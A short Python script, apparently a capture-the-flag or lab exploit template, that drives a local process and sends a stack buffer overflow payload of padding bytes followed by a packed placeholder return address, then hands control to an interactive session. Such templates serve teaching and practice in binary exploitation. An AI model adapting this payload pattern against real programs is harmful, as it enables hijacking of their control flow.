import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
p.readuntil('Enter data: ')
p.sendline('A'*32 + 'B'*8 + p64(0xDEADBEEF0BADC0DE))
# data = p.readuntil('\n')
# p.sendline('hello')

p.interactive()
